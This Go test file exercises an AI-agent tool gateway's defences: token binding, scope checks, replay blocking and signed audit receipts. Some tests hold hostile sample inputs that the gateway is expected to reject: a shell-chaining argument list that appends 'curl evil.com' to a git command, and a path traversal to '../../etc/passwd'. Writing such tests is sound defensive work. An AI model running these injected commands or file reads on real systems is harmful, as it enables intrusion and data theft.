package gateway

import (
	"context"
	"errors"
	"os"
	"testing"
	"time"

	"github.com/bonjoski/conjoiner/pkg/ledger"
	"github.com/bonjoski/conjoiner/pkg/token"
)

func TestGatewayExecutionSuccess(t *testing.T) {
	broker, err := token.NewTokenBroker(token.BrokerConfig{})
	if err != nil {
		t.Fatalf("failed to create broker: %v", err)
	}

	dpopKey, _ := token.GenerateDPoPKey()
	ctx := context.Background()

	// 1. Issue task token with git execute permission
	_, tokenJWT, err := broker.IssueRootToken(ctx, token.RootTokenRequest{
		Subject:        "agent-007",
		Scopes:         []string{"tool:exec:git:status"},
		TTL:            30 * time.Second,
		DPoPThumbprint: dpopKey.Thumbprint(),
	})
	if err != nil {
		t.Fatalf("failed to issue token: %v", err)
	}

	// 2. Setup gateway with mock executor
	mockExec := &MockToolExecutor{
		ResultFn: func(ctx context.Context, execCtx ExecutionContext) (*ExecutionResult, error) {
			return &ExecutionResult{
				ExitCode: 0,
				Stdout:   "On branch main\nnothing to commit",
				Stderr:   "",
				Duration: 5 * time.Millisecond,
			}, nil
		},
	}

	gw, err := NewGateway(GatewayConfig{
		BrokerPubKey: broker.PublicKey(),
		ReplayCache:  broker.ReplayCache(),
		Executor:     mockExec,
	})
	if err != nil {
		t.Fatalf("failed to initialize gateway: %v", err)
	}

	// 3. Generate valid DPoP proof bound to the action and target token
	proof, err := dpopKey.CreateProof("EXEC", "tool://git", tokenJWT)
	if err != nil {
		t.Fatalf("failed to create dpop proof: %v", err)
	}

	// 4. Execute tool request
	resp, err := gw.Execute(ctx, ToolInvocationRequest{
		Token:     tokenJWT,
		DPoPProof: proof,
		ToolName:  "git",
		Action:    "status",
		Arguments: []string{"-s"},
	})
	if err != nil {
		t.Fatalf("expected tool execution to succeed, got error: %v", err)
	}

	if resp.Result.ExitCode != 0 {
		t.Errorf("expected exit code 0, got %d", resp.Result.ExitCode)
	}
	if resp.Result.Stdout == "" {
		t.Errorf("expected stdout, got empty")
	}
}

func TestGatewayAttackerTokenTheftBlocked(t *testing.T) {
	// Attacker intercepts tokenJWT, but does NOT possess the victim's ephemeral DPoP private key.
	// Attacker tries to generate a DPoP proof with attacker's key.
	broker, _ := token.NewTokenBroker(token.BrokerConfig{})
	victimDPoP, _ := token.GenerateDPoPKey()
	attackerDPoP, _ := token.GenerateDPoPKey()

	ctx := context.Background()

	_, stolenTokenJWT, err := broker.IssueRootToken(ctx, token.RootTokenRequest{
		Subject:        "victim-agent",
		Scopes:         []string{"tool:exec:git:status"},
		TTL:            30 * time.Second,
		DPoPThumbprint: victimDPoP.Thumbprint(),
	})
	if err != nil {
		t.Fatalf("failed to issue token: %v", err)
	}

	gw, _ := NewGateway(GatewayConfig{
		BrokerPubKey: broker.PublicKey(),
		ReplayCache:  broker.ReplayCache(),
		Executor:     &MockToolExecutor{},
	})

	// Attacker generates proof signed with attacker's private key
	attackerProof, err := attackerDPoP.CreateProof("EXEC", "tool://git", stolenTokenJWT)
	if err != nil {
		t.Fatalf("failed creating attacker proof: %v", err)
	}

	_, err = gw.Execute(ctx, ToolInvocationRequest{
		Token:     stolenTokenJWT,
		DPoPProof: attackerProof,
		ToolName:  "git",
		Action:    "status",
	})
	if err == nil {
		t.Fatalf("expected attacker request to fail due to DPoP key mismatch, got nil")
	}
	if !errors.Is(err, token.ErrDPoPBindingMismatch) {
		t.Errorf("expected ErrDPoPBindingMismatch, got: %v", err)
	}
}

func TestGatewayCommandInjectionBlocked(t *testing.T) {
	broker, _ := token.NewTokenBroker(token.BrokerConfig{})
	dpopKey, _ := token.GenerateDPoPKey()
	ctx := context.Background()

	_, tokenJWT, _ := broker.IssueRootToken(ctx, token.RootTokenRequest{
		Subject:        "agent-injected",
		Scopes:         []string{"tool:exec:git:status"},
		TTL:            30 * time.Second,
		DPoPThumbprint: dpopKey.Thumbprint(),
	})

	gw, _ := NewGateway(GatewayConfig{
		BrokerPubKey: broker.PublicKey(),
		ReplayCache:  broker.ReplayCache(),
		Executor:     &MockToolExecutor{},
	})

	// Attempt argument injection with shell chaining `git status && curl evil.com`
	proof, _ := dpopKey.CreateProof("EXEC", "tool://git", tokenJWT)
	_, err := gw.Execute(ctx, ToolInvocationRequest{
		Token:     tokenJWT,
		DPoPProof: proof,
		ToolName:  "git",
		Action:    "status",
		Arguments: []string{"&&", "curl", "evil.com"},
	})
	if err == nil {
		t.Fatalf("expected command injection to be blocked, got nil")
	}
	if !errors.Is(err, ErrCommandInjectionDetected) {
		t.Errorf("expected ErrCommandInjectionDetected, got: %v", err)
	}
}

func TestGatewayPathTraversalBlocked(t *testing.T) {
	broker, _ := token.NewTokenBroker(token.BrokerConfig{})
	dpopKey, _ := token.GenerateDPoPKey()
	ctx := context.Background()

	_, tokenJWT, _ := broker.IssueRootToken(ctx, token.RootTokenRequest{
		Subject:        "agent-traversal",
		Scopes:         []string{"tool:cat:read"},
		TTL:            30 * time.Second,
		DPoPThumbprint: dpopKey.Thumbprint(),
	})

	gw, _ := NewGateway(GatewayConfig{
		BrokerPubKey: broker.PublicKey(),
		ReplayCache:  broker.ReplayCache(),
		Executor:     &MockToolExecutor{},
	})

	proof, _ := dpopKey.CreateProof("EXEC", "tool://cat", tokenJWT)
	_, err := gw.Execute(ctx, ToolInvocationRequest{
		Token:     tokenJWT,
		DPoPProof: proof,
		ToolName:  "cat",
		Action:    "read",
		Resource:  "../../etc/passwd",
	})
	if err == nil {
		t.Fatalf("expected path traversal to be blocked, got nil")
	}
	if !errors.Is(err, ErrPathTraversalDetected) {
		t.Errorf("expected ErrPathTraversalDetected, got: %v", err)
	}
}

func TestGatewayInsufficientScopeBlocked(t *testing.T) {
	broker, _ := token.NewTokenBroker(token.BrokerConfig{})
	dpopKey, _ := token.GenerateDPoPKey()
	ctx := context.Background()

	// Token only has git:status
	_, tokenJWT, _ := broker.IssueRootToken(ctx, token.RootTokenRequest{
		Subject:        "agent-limited",
		Scopes:         []string{"tool:exec:git:status"},
		TTL:            30 * time.Second,
		DPoPThumbprint: dpopKey.Thumbprint(),
	})

	gw, _ := NewGateway(GatewayConfig{
		BrokerPubKey: broker.PublicKey(),
		ReplayCache:  broker.ReplayCache(),
		Executor:     &MockToolExecutor{},
	})

	// Attempt git:push
	proof, _ := dpopKey.CreateProof("EXEC", "tool://git", tokenJWT)
	_, err := gw.Execute(ctx, ToolInvocationRequest{
		Token:     tokenJWT,
		DPoPProof: proof,
		ToolName:  "git",
		Action:    "push",
	})
	if err == nil {
		t.Fatalf("expected insufficient scope to fail, got nil")
	}
	if !errors.Is(err, ErrScopeInsufficient) {
		t.Errorf("expected ErrScopeInsufficient, got: %v", err)
	}
}

func TestGatewayReplayProofBlocked(t *testing.T) {
	broker, _ := token.NewTokenBroker(token.BrokerConfig{})
	dpopKey, _ := token.GenerateDPoPKey()
	ctx := context.Background()

	_, tokenJWT, _ := broker.IssueRootToken(ctx, token.RootTokenRequest{
		Subject:        "agent-replay",
		Scopes:         []string{"tool:exec:git:status"},
		TTL:            30 * time.Second,
		DPoPThumbprint: dpopKey.Thumbprint(),
	})

	gw, _ := NewGateway(GatewayConfig{
		BrokerPubKey: broker.PublicKey(),
		ReplayCache:  broker.ReplayCache(),
		Executor:     &MockToolExecutor{},
	})

	proof, _ := dpopKey.CreateProof("EXEC", "tool://git", tokenJWT)

	// First execution passes
	_, err := gw.Execute(ctx, ToolInvocationRequest{
		Token:     tokenJWT,
		DPoPProof: proof,
		ToolName:  "git",
		Action:    "status",
	})
	if err != nil {
		t.Fatalf("first execution should pass, got: %v", err)
	}

	// Replay exact same proof with same JTI -> fails!
	_, err = gw.Execute(ctx, ToolInvocationRequest{
		Token:     tokenJWT,
		DPoPProof: proof,
		ToolName:  "git",
		Action:    "status",
	})
	if err == nil {
		t.Fatalf("expected replayed proof execution to fail, got nil")
	}
	if !errors.Is(err, token.ErrDPoPProofReplayed) {
		t.Errorf("expected ErrDPoPProofReplayed, got: %v", err)
	}
}

func TestSafeLocalExecutor(t *testing.T) {
	ctx := context.Background()
	exec := NewSafeLocalExecutor(map[string]string{
		"echo": "/bin/echo",
	}, 5*time.Second)

	res, err := exec.Execute(ctx, ExecutionContext{
		ToolName:  "echo",
		Action:    "print",
		Arguments: []string{"hello", "conjoiner"},
	})
	if err != nil {
		t.Fatalf("expected safe echo to succeed, got: %v", err)
	}
	if res.ExitCode != 0 {
		t.Errorf("expected exit code 0, got %d", res.ExitCode)
	}
	if res.Stdout != "hello conjoiner\n" {
		t.Errorf("expected 'hello conjoiner\\n', got '%s'", res.Stdout)
	}

	// Test unregistered binary
	_, err = exec.Execute(ctx, ExecutionContext{
		ToolName: "malicious_binary",
	})
	if err == nil {
		t.Errorf("expected unregistered binary to fail, got nil")
	}
}

func TestGatewayLedgerReceiptEmission(t *testing.T) {
	broker, _ := token.NewTokenBroker(token.BrokerConfig{})
	dpopKey, _ := token.GenerateDPoPKey()
	ctx := context.Background()

	sessionID := "session-cil-test"

	_, tokenJWT, err := broker.IssueRootToken(ctx, token.RootTokenRequest{
		Subject:        "agent-cil-01",
		SessionID:      sessionID,
		Scopes:         []string{"tool:exec:git:status"},
		TTL:            30 * time.Second,
		DPoPThumbprint: dpopKey.Thumbprint(),
	})
	if err != nil {
		t.Fatalf("failed issuing token: %v", err)
	}

	executed := false
	mockExec := &MockToolExecutor{
		ResultFn: func(ctx context.Context, execCtx ExecutionContext) (*ExecutionResult, error) {
			executed = true
			return &ExecutionResult{
				ExitCode: 0,
				Stdout:   "clean",
			}, nil
		},
	}

	gw, err := NewGateway(GatewayConfig{
		BrokerPubKey: broker.PublicKey(),
		ReplayCache:  broker.ReplayCache(),
		Executor:     mockExec,
	})
	if err != nil {
		t.Fatalf("failed initializing gateway: %v", err)
	}

	proof, _ := dpopKey.CreateProof("EXEC", "tool://git", tokenJWT)

	resp, err := gw.Execute(ctx, ToolInvocationRequest{
		Token:     tokenJWT,
		DPoPProof: proof,
		ToolName:  "git",
		Action:    "status",
		Arguments: []string{"-s"},
		SessionID: sessionID,
	})
	if err != nil {
		t.Fatalf("expected execute to succeed, got: %v", err)
	}

	if !executed {
		t.Fatal("expected tool to be executed")
	}

	if resp.Receipt == nil {
		t.Fatal("expected non-nil SignedIntentReceipt in response")
	}

	if resp.Receipt.Verdict != ledger.VerdictAllow {
		t.Fatalf("expected VerdictAllow, got %s", resp.Receipt.Verdict)
	}
	if resp.Receipt.SequenceNumber != 1 {
		t.Fatalf("expected sequence 1, got %d", resp.Receipt.SequenceNumber)
	}
	if resp.Receipt.SessionID != sessionID {
		t.Fatalf("expected session %s, got %s", sessionID, resp.Receipt.SessionID)
	}

	// Verify receipt against gateway's ledger key
	if err := resp.Receipt.Verify(gw.Ledger().PublicKey()); err != nil {
		t.Fatalf("receipt verification failed: %v", err)
	}

	// Verify session in gateway's ledger
	receipts, err := gw.Ledger().VerifySession(sessionID)
	if err != nil {
		t.Fatalf("ledger session audit failed: %v", err)
	}
	if len(receipts) != 1 {
		t.Fatalf("expected 1 receipt in ledger, got %d", len(receipts))
	}
}

func TestGatewayLedgerRejectionProofEmissionAndFailClosed(t *testing.T) {
	broker, _ := token.NewTokenBroker(token.BrokerConfig{})
	dpopKey, _ := token.GenerateDPoPKey()
	ctx := context.Background()

	sessionID := "session-rejection-test"

	_, tokenJWT, _ := broker.IssueRootToken(ctx, token.RootTokenRequest{
		Subject:        "agent-drift-attacker",
		SessionID:      sessionID,
		Scopes:         []string{"tool:exec:git:status"},
		TTL:            30 * time.Second,
		DPoPThumbprint: dpopKey.Thumbprint(),
	})

	toolExecuted := false
	mockExec := &MockToolExecutor{
		ResultFn: func(ctx context.Context, execCtx ExecutionContext) (*ExecutionResult, error) {
			toolExecuted = true
			return &ExecutionResult{ExitCode: 0}, nil
		},
	}

	gw, _ := NewGateway(GatewayConfig{
		BrokerPubKey: broker.PublicKey(),
		ReplayCache:  broker.ReplayCache(),
		Executor:     mockExec,
	})

	// 1. Out-of-scope mutation -> triggers DENY_SCOPE rejection proof
	proof1, _ := dpopKey.CreateProof("EXEC", "tool://git", tokenJWT)
	_, err := gw.Execute(ctx, ToolInvocationRequest{
		Token:     tokenJWT,
		DPoPProof: proof1,
		ToolName:  "git",
		Action:    "push", // Not authorized!
		SessionID: sessionID,
	})
	if err == nil {
		t.Fatal("expected out-of-scope mutation to fail, got nil")
	}

	if toolExecuted {
		t.Fatal("CRITICAL INVARIANT VIOLATION: Tool was executed despite policy rejection!")
	}

	crp1 := ledger.ExtractRejectionProof(err)
	if crp1 == nil {
		t.Fatal("expected CryptographicRejectionProof to be present in error")
	}
	if crp1.Verdict != ledger.VerdictDenyScope {
		t.Fatalf("expected VerdictDenyScope, got %s", crp1.Verdict)
	}
	if err := crp1.Verify(gw.Ledger().PublicKey()); err != nil {
		t.Fatalf("CRP1 verification failed: %v", err)
	}

	// 2. Argument injection -> triggers DENY_DRIFT rejection proof
	proof2, _ := dpopKey.CreateProof("EXEC", "tool://git", tokenJWT)
	_, err = gw.Execute(ctx, ToolInvocationRequest{
		Token:     tokenJWT,
		DPoPProof: proof2,
		ToolName:  "git",
		Action:    "status",
		Arguments: []string{"&&", "curl", "evil.com"}, // Injection!
		SessionID: sessionID,
	})
	if err == nil {
		t.Fatal("expected argument injection to fail, got nil")
	}

	if toolExecuted {
		t.Fatal("CRITICAL INVARIANT VIOLATION: Tool was executed despite argument injection!")
	}

	crp2 := ledger.ExtractRejectionProof(err)
	if crp2 == nil {
		t.Fatal("expected CryptographicRejectionProof for injection")
	}
	if crp2.Verdict != ledger.VerdictDenyDrift {
		t.Fatalf("expected VerdictDenyDrift, got %s", crp2.Verdict)
	}
	if err := crp2.Verify(gw.Ledger().PublicKey()); err != nil {
		t.Fatalf("CRP2 verification failed: %v", err)
	}

	// Verify hash chain between crp1 and crp2 in session ledger
	receipts, err := gw.Ledger().VerifySession(sessionID)
	if err != nil {
		t.Fatalf("session ledger audit failed: %v", err)
	}
	if len(receipts) != 2 {
		t.Fatalf("expected 2 rejection receipts in ledger, got %d", len(receipts))
	}
	if receipts[0].SequenceNumber != 1 || receipts[0].Verdict != ledger.VerdictDenyScope {
		t.Fatalf("unexpected receipt 1: %+v", receipts[0])
	}
	if receipts[1].SequenceNumber != 2 || receipts[1].Verdict != ledger.VerdictDenyDrift {
		t.Fatalf("unexpected receipt 2: %+v", receipts[1])
	}
	if receipts[1].PrevReceiptHash != receipts[0].Hash() {
		t.Fatalf("hash chain broken between rejections")
	}
}

func TestGatewayPersistentLedgerAudit(t *testing.T) {
	tmpDir, _ := os.MkdirTemp("", "conjoiner-gw-ledger-*")
	defer os.RemoveAll(tmpDir)

	fileLedger, err := ledger.NewEngine(ledger.Config{
		BaseDir: tmpDir,
	})
	if err != nil {
		t.Fatalf("failed creating file ledger: %v", err)
	}
	defer fileLedger.Close()

	broker, _ := token.NewTokenBroker(token.BrokerConfig{})
	dpopKey, _ := token.GenerateDPoPKey()
	ctx := context.Background()

	sessionID := "persistent-worktree-session"

	_, tokenJWT, _ := broker.IssueRootToken(ctx, token.RootTokenRequest{
		Subject:        "agent-persisted",
		SessionID:      sessionID,
		Scopes:         []string{"tool:exec:git:status"},
		TTL:            30 * time.Second,
		DPoPThumbprint: dpopKey.Thumbprint(),
	})

	gw, _ := NewGateway(GatewayConfig{
		BrokerPubKey: broker.PublicKey(),
		ReplayCache:  broker.ReplayCache(),
		Executor: &MockToolExecutor{
			ResultFn: func(ctx context.Context, execCtx ExecutionContext) (*ExecutionResult, error) {
				return &ExecutionResult{ExitCode: 0, Stdout: "persisted"}, nil
			},
		},
		Ledger: fileLedger,
	})

	proof, _ := dpopKey.CreateProof("EXEC", "tool://git", tokenJWT)

	_, err = gw.Execute(ctx, ToolInvocationRequest{
		Token:     tokenJWT,
		DPoPProof: proof,
		ToolName:  "git",
		Action:    "status",
		SessionID: sessionID,
	})
	if err != nil {
		t.Fatalf("gateway execution failed: %v", err)
	}

	// Verify file was written to disk
	walEntries, err := fileLedger.VerifySession(sessionID)
	if err != nil {
		t.Fatalf("failed verifying session WAL on disk: %v", err)
	}
	if len(walEntries) != 1 {
		t.Fatalf("expected 1 receipt in disk WAL, got %d", len(walEntries))
	}
}
